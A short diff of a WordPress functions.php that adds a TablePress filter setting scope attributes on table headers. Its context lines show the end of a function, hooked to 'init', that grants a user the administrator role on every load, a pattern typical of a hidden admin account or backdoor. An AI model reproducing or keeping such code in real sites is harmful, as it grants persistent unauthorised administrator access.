@@ -120,4 +120,34 @@ function wpb_admin_account(){
 	$user->set_role( 'administrator' );
 	} }
 	add_action('init','wpb_admin_account');
+
+/**
+ * Add scope attributes to table headers
+ *
+ * @param  mixed $output HTML output of the table.
+ * @param  mixed $table Table object.
+ * @param  array $render_options Render options.
+ * @return string HTML output of the table.
+ */
+function tablepress_add_scope( $output, $table, $render_options ) {
+	$dom = new DOMDocument();
+	$dom->loadHTML( $output );
+	$xpath = new DOMXPath( $dom );
+	if ( $render_options['table_head'] ) {
+		$th = $xpath->query( '//thead/tr/th' );
+		foreach ( $th as $node ) {
+			$node->setAttribute( 'scope', 'col' );
+		}
+	}
+	if ( $render_options['first_column_th'] ) {
+		$th = $xpath->query( '//tbody/tr/th' );
+		foreach ( $th as $node ) {
+			$node->setAttribute( 'scope', 'row' );
+		}
+	}
+	$output = $dom->saveHTML();
+	return $output;
+}
+add_filter( 'tablepress_table_output', 'tablepress_add_scope', 10, 3 );
+
 ?>
